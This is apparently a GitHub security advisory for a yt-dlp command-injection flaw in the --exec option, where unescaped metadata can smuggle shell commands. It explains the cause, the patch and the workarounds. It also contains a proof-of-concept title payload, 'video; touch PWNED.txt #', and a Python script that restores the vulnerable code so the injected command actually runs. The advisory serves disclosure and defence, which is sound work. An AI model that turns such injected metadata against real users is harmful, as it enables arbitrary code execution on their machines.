# [H] yt-dlp: Arbitrary command injection possible if --exec option used with yt-dlp

## Summary
Severity: High
Advisory: GHSA-69qj-pvh9-c5wg
CWE: CWE-78
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-16
Source: https://github.com/advisories/GHSA-69qj-pvh9-c5wg
Type: github-advisory

## Affected
- PyPI: `yt-dlp` — affected >=2021.4.11 <2026.6.9

## Details
### Summary
yt-dlp's `--exec` option is vulnerable to arbitrary command injection when handling untrusted metadata if the argument uses standard string formatting (e.g. `%(title)s`) or other unsafe conversions. An attacker could achieve remote code execution on the user's machine via maliciously crafted metadata containing quotes or other special shell characters.

### Details
Since yt-dlp version 2021.04.11, the `--exec` option has supported "output template syntax", which is a superset of Python's `printf`-style string formatting also used by the `--output` option. This means the user is able to pass a "command template" as an argument to the `--exec` option which will be executed by the user's shell. The command template allows for the downloaded video's metadata to be interpolated into the command string.

yt-dlp implements a `%()q` conversion, which will shell-quote/escape any metadata value such that it is safe to be interpolated into a command string. However, there are unsafe conversions such as `%()s` which result in the command template being formatted with the raw metadata string. These unsafe conversions do not perform any sanitization or escaping for shell contexts. If one or more of these unsafe conversions is used in the command template, an attacker can craft a malicious metadata value containing shell operators (e.g. `;`, `&`, `|`) to break out of the intended command and execute payload commands.

### Impact

The impact is limited to users who pass an `--exec` command template containing unsafe conversions in their yt-dlp command or configuration file: `%()s`, `%()a`, `%()r`, `%()j`, `%()S` (including any of their flagged variants.)

### Patches

yt-dlp version 2026.06.09 fixes this issue by restricting the conversions that can be used in an `--exec` command template to those known to be safe: `%()d`, `%()i`, `%()f`, `%()q` (including any of their flagged variants.) It also restricts the characters that can be used in command template defaults and placeholders when the user passes an `--exec` argument containing output template syntax.

### Workarounds

This vulnerability can be fully mitigated by doing any of the following:

- Upgrade yt-dlp to version 2026.06.09 or later
- Only use safe conversions (e.g. `%()d`, `%()i`, `%()f`, `%()q`) in any `--exec` command templates
- Do not use "output template syntax" in any `--exec` arguments
- Do not use the `--exec` option

### Proof-of-Concept

1. An attacker sets the title of a video to a malicious payload, e.g.: `video; touch pwned.txt #`
2. The victim downloads this video using yt-dlp with the `--exec` flag.

Reproduction steps (simulated):
1.  Create a python script poc.py to simulate the internal behavior:

```bash
import unittest
import os

from yt_dlp.postprocessor.exec import ExecPP
from yt_dlp.YoutubeDL import YoutubeDL
from yt_dlp.utils import PostProcessingError

# Import Popen to use the REAL one for the PoC (to actually create the file)
from yt_dlp.utils import Popen as RealPopen

class TestDemonstrativePoC(unittest.TestCase):
    FILE_NAME = "PWNED.txt"

    def setUp(self):
        # Remove the file if it exists
        if os.path.exists(self.FILE_NAME):
            os.remove(self.FILE_NAME)

    def test_1_demonstrate_vulnerability_simulated(self):
        """
        Simulates the code BEFORE the fix to show what would happen.
        """
        print("\n--- TEST 1: Simulating vulnerable state ---")

        # 1. Define the vulnerable Parse Method
        def vulnerable_parse_cmd(self, cmd, info):
            # This mimics the code before my patch
            tmpl, tmpl_dict = self._downloader.prepare_outtmpl(cmd, info)
            if tmpl_dict:
                return self._downloader.escape_outtmpl(tmpl) % tmpl_dict
            return cmd

        # 2. Patch the class temporarily
        original_parse_cmd = ExecPP.parse_cmd
        ExecPP.parse_cmd = vulnerable_parse_cmd

        info = {
            'id': '1234',
            # MALICIOUS TITLE:
            # 1. 'video' gets echoed
            # 2. ; separator
            # 3. touch PWNED.txt creates the file
            # 4. # comments out the rest
            'title': f'video; touch {self.FILE_NAME} #',
            'ext': 'mp4',
            'filepath': 'video.mp4'
        }

        ydl = YoutubeDL({'verbose': False, 'quiet': True})

        try:
            print(f"[*] Payload Title: {info['title']}")
            print("[*] Executing: echo %(title)s")

            # Use the REAL Popen to actually execute shell commands
            import yt_dlp.postprocessor.exec
            original_popen_ref = yt_dlp.postprocessor.exec.Popen
            yt_dlp.postprocessor.exec.Popen = RealPopen

            pp = ExecPP(ydl, 'echo %(title)s')
            pp.run(info)

            # Restore Popen ref
            yt_dlp.postprocessor.exec.Popen = original_popen_ref

            # Check if file was created
            if os.path.exists(self.FILE_NAME):
                print(f"[!] VULNERABILITY CONFIRMED: File '{self.FILE_NAME}' was created on disk!")
            else:
                print("[?] File not created. Payload might have failed.")

        finally:
            # Restore the secure method
            ExecPP.parse_cmd = original_parse_cmd

if __name__ == '__main__':
    unittest.main()
```
2. Run the script: `python3 poc.py`
3. Check the directory. A file named `PWNED.txt` will be created, proving arbitrary command execution.

<img width="1386" height="757" alt="poc" src="https://github.com/user-attachments/assets/b21a1dd9-f86d-4836-861b-7e880f639c08" />

## References
- https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-69qj-pvh9-c5wg
- https://github.com/yt-dlp/yt-dlp/pull/16883
- https://github.com/yt-dlp/yt-dlp/commit/5faffa999fd33b373d47773e8ee639d072accec2
- https://github.com/yt-dlp/yt-dlp
- https://github.com/yt-dlp/yt-dlp-nightly-builds/releases/tag/2026.06.06.234447
- https://github.com/yt-dlp/yt-dlp/releases/tag/2026.06.09
